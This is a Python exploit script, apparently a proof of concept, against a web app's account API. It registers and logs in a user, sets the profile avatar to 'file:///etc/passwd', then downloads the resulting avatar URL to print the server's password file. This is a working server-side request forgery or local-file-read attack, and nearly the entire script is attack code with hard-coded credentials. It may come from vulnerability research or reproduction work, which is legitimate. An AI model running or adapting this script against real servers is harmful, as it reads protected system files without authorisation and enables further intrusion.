import requests
import json

BASE_URL = "http://127.0.0.1:20208"
def register(phone, password):
    url = BASE_URL + '/api/account/register' 
    user = {
        "mobile": phone,
        "password": password,
        "client": 6
    }
    r = requests.post(url, json=user, verify=False)
    response = json.loads(r.text)
    if response["code"] == 1:
        print("Register Thanh Cong")
        return True
    return False


def login(phone, password):
    url =  BASE_URL + '/api/account/login' 

    user = {
        "account": phone,
        "password": password,
        "client": 6
    }
    r = requests.post(url, json=user, verify=False)
    response = json.loads(r.text)
    if response["code"] == 1:
        print(response)
        token = response['data']['token']
        return token
    return None

def updateWechat(token, avatar):
    url = BASE_URL + '/api/user/setWechatInfo'
    
    user = {
        "nickname":"nickname",
        "avatar": avatar,
        "sex": 1
    }
    r = requests.post(url, headers={"token": token}, json=user, verify=False)
    response = json.loads(r.text)
    if response["code"] == 1:
        print('Update profile')
        return True
    return False

def userInfo(token):
    url = BASE_URL + '/api/user/info'

    r = requests.get(url, headers={"token": token}, verify=False)
    response = json.loads(r.text)
    if response["code"] == 1:
        avatar_url = response['data']['avatar']
        print(avatar_url)
        return avatar_url
    return None

def checkFile(avatar_url):
    if avatar_url != "": 
        r = requests.get(avatar_url, verify=False)
        response = r.text
        if r.status_code == 200:
            print(response)
        return None



phone = "18321267252"
password = "a1@123"
avatar = "file:///etc/passwd"

status = register(phone, password)
status = True
if status :
    token = login(phone, password)
    print(token)
    status_update = updateWechat(token, avatar)
    if status_update:
        avatar_url = userInfo(token)
        if avatar_url:
            print(avatar_url)
            checkFile(avatar_url)
        else:
            print('Khong upload Avatar')